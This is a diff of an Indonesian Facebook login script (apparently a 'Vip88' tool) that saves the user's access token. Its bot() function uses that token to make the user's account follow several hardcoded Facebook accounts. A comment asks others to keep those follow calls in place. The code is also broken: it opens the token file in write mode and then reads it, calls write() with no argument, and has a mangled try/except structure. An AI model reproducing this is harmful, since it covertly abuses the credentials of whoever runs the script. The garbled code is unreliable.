@@ -103,16 +103,17 @@ def login_lagi():
 				open('token.x','w').write()
 				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
 				bot()
-			except KeyError:
+
+# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
+
+def bot():
+		try:
+			toket = open('token.x','w').read()
+	    except KeyError:
 				print(' [%s!%s] Token Error Coba Ganti Akun Tumbal'%(M,N))
 				print(' [%s!%s] Silahkan Masukan Kembali Perintah'%(M,N))
 				print(' [%s!%s] python Vip88.py!'%(M,N))
 				exit()	
-
-# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
-def bot():
-		try:
-			toket = open('token.x','w').read()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
